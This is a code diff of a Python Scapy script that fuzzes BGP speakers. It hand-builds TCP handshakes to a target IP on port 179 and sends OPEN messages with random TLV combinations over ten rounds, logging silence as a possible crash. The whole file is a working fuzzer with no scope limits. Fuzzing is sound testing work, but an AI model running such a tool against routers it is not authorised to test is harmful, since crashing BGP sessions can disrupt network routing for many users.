@@ -1,11 +1,10 @@
-
 from scapy.all import *
 from scapy.contrib.bgp import *
 import random
 import logging
 import time
 
-logging.basicConfig(filename='codex_tlv_cyclone.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+logging.basicConfig(filename='testing.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 def build_varied_tlvs():
     tlvs = []
@@ -28,48 +27,50 @@ def build_varied_tlvs():
     return tlvs
 
 def send_multi_tlv_fuzz(dst_ip, dst_port=179):
-    ip = IP(dst=dst_ip)
-    src_port = RandShort()
+    for round_id in range(10):  # 10 iterations
+        print(f"[*] Round {round_id + 1}/10")
+        ip = IP(dst=dst_ip)
+        src_port = RandShort()
 
-    syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
-    syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+        syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+        syn_ack = sr1(ip/syn, timeout=3, verbose=0)
 
-    if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
-        print("[!] No SYN-ACK — target may be filtered.")
-        logging.info("No SYN-ACK received.")
-        return
+        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+            print(f"[!] No SYN-ACK (round {round_id + 1})")
+            logging.info(f"[{round_id}] No SYN-ACK received.")
+            continue
 
-    ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
-    send(ip/ack, verbose=0)
+        ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+        send(ip/ack, verbose=0)
 
-    tlvs = build_varied_tlvs()
-    combined = b''.join(random.sample(tlvs, k=random.randint(2, len(tlvs))))
+        tlvs = build_varied_tlvs()
+        combined = b''.join(random.sample(tlvs, k=random.randint(2, len(tlvs))))
 
-    open_hdr = bytes([
-        4,                    # version
-        0xFC, 0x00,           # my_as = 64512
-        0x00, 0x5A,           # hold_time = 90
-        1, 2, 3, 4,           # BGP ID
-        len(combined)         # Total opt_param_len
-    ]) + combined
+        open_hdr = bytes([
+            4,                    # version
+            0xFC, 0x00,           # my_as = 64512
+            0x00, 0x5A,           # hold_time = 90
+            1, 2, 3, 4,           # BGP ID
+            len(combined)         # opt_param_len
+        ]) + combined
 
-    pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/BGPHeader(type=1)/Raw(load=open_hdr)
-    print(f"[+] Sending Multi-TLV combo: {len(combined)} bytes")
-    logging.info(f"Multi-TLV Packet (len={len(combined)}): {combined.hex()}")
+        pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/BGPHeader(type=1)/Raw(load=open_hdr)
+        print(f"[+] Sending TLV combo (len={len(combined)})")
+        logging.info(f"[{round_id}] TLV Combo Sent (len={len(combined)}): {combined.hex()}")
 
-    response = sr1(pkt, timeout=3, verbose=0)
-    if response:
-        print("[+] Response:", response.summary())
-        logging.info(f"Response: {response.summary()}")
-    else:
-        print("[!] No response — possible crash or silent reject")
-        logging.info("No response received.")
+        response = sr1(pkt, timeout=3, verbose=0)
+        if response:
+            print(f"[+] Response (Round {round_id + 1}):", response.summary())
+            logging.info(f"[{round_id}] Response: {response.summary()}")
+        else:
+            print(f"[!] No response (Round {round_id + 1}) — possible crash or silent drop")
+            logging.info(f"[{round_id}] No response.")
 
-    time.sleep(1)
+        time.sleep(1.25)
 
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 2:
-        print("Usage: sudo python3 codex_tlv_cyclone.py <target_ip>")
+        print("Usage: sudo python3 test.py <target_ip>")
         sys.exit(1)
     send_multi_tlv_fuzz(sys.argv[1])
